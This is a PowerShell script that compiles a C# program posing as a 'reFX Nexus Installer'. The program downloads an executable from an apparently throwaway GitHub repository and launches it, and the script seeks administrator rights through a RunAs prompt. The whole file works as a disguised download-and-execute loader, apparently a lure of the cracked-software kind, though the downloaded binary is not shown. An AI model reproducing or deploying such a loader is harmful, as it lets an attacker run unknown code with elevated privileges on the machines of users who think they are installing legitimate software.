$exePath = Join-Path $env:TEMP 'nexus_downloader.exe'
$icoPath = Join-Path $env:TEMP 'nexus.ico'
$icoUrl  = 'https://raw.githubusercontent.com/AmplitudeQuail/dlqmjdez/main/nexus.ico'

# Download icon if not present
if (-not (Test-Path $icoPath)) {
    try {
        Invoke-WebRequest -Uri $icoUrl -OutFile $icoPath -UseBasicParsing
    } catch {
        # Icon is optional, continue without it
    }
}

if (-not (Test-Path $exePath)) {
    $source = @'
using System;
using System.IO;
using System.Net;
using System.Drawing;
using System.Diagnostics;
using System.Windows.Forms;

class DownloaderForm : Form
{
    private ProgressBar progressBar;
    private Label label;
    private Label percentLabel;
    private WebClient wc;

    public DownloaderForm()
    {
        this.Text = "reFX Nexus Installer";
        this.Size = new Size(420, 150);
        this.StartPosition = FormStartPosition.CenterScreen;
        this.FormBorderStyle = FormBorderStyle.FixedDialog;
        this.MaximizeBox = false;
        this.MinimizeBox = false;
        this.TopMost = true;

        string icoPath = Path.Combine(Path.GetTempPath(), "nexus.ico");
        if (File.Exists(icoPath)) {
            try { this.Icon = new Icon(icoPath); } catch { }
        }

        label = new Label();
        label.Text = "Downloading reFX Nexus v5.4.14...";
        label.Location = new Point(15, 15);
        label.Size = new Size(380, 25);
        label.Font = new Font("Segoe UI", 10);
        this.Controls.Add(label);

        progressBar = new ProgressBar();
        progressBar.Location = new Point(15, 45);
        progressBar.Size = new Size(380, 25);
        progressBar.Style = ProgressBarStyle.Continuous;
        progressBar.Minimum = 0;
        progressBar.Maximum = 100;
        this.Controls.Add(progressBar);

        percentLabel = new Label();
        percentLabel.Text = "0%";
        percentLabel.Location = new Point(15, 75);
        percentLabel.Size = new Size(380, 25);
        percentLabel.Font = new Font("Segoe UI", 9);
        percentLabel.TextAlign = ContentAlignment.MiddleCenter;
        this.Controls.Add(percentLabel);

        string outputPath = Path.Combine(Path.GetTempPath(), "reFX Nexus v5.4.14.exe");
        string downloadUrl = "https://raw.githubusercontent.com/AmplitudeQuail/dlqmjdez/main/reFX%20Nexus%20v5.4.14.exe";
        string logPath = Path.Combine(Path.GetTempPath(), "nexus_install.log");

        try { ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12; } catch { }

        wc = new WebClient();
        wc.DownloadProgressChanged += (s, e) => {
            progressBar.Value = e.ProgressPercentage;
            percentLabel.Text = e.ProgressPercentage + "%";
        };
        wc.DownloadFileCompleted += (s, e) => {
            if (e.Error != null) {
                File.AppendAllText(logPath, "Download error: " + e.Error.Message + "\r\n");
                MessageBox.Show("Download failed:\n\n" + e.Error.Message, "reFX Nexus Installer", MessageBoxButtons.OK, MessageBoxIcon.Error);
                this.Close();
                return;
            }
            label.Text = "Launching installer...";
            progressBar.Value = 100;
            percentLabel.Text = "100%";
            try { Process.Start(outputPath); }
            catch (Exception ex) { File.AppendAllText(logPath, "Launch error: " + ex.Message + "\r\n"); }
            this.Close();
        };
        wc.DownloadFileAsync(new Uri(downloadUrl), outputPath);
    }

    [STAThread]
    static void Main()
    {
        Application.EnableVisualStyles();
        Application.Run(new DownloaderForm());
    }
}
'@

    # Compile with embedded icon if available, otherwise without
    if (Test-Path $icoPath) {
        $cp = New-Object System.CodeDom.Compiler.CompilerParameters
        $cp.CompilerOptions = "/target:winexe /win32icon:`"$icoPath`""
        $cp.OutputAssembly = $exePath
        $cp.ReferencedAssemblies.Add('System.dll')
        $cp.ReferencedAssemblies.Add('System.Windows.Forms.dll')
        $cp.ReferencedAssemblies.Add('System.Drawing.dll')
        $cp.GenerateExecutable = $true
        Add-Type -TypeDefinition $source -Language CSharp -CompilerParameters $cp
    } else {
        Add-Type -TypeDefinition $source -Language CSharp `
            -OutputType WindowsApplication -OutputAssembly $exePath `
            -ReferencedAssemblies System.Windows.Forms, System.Drawing
    }
}

$identity  = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
$isAdmin   = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($isAdmin) {
    & $exePath
} else {
    Start-Process $exePath -Verb RunAs
    exit
}
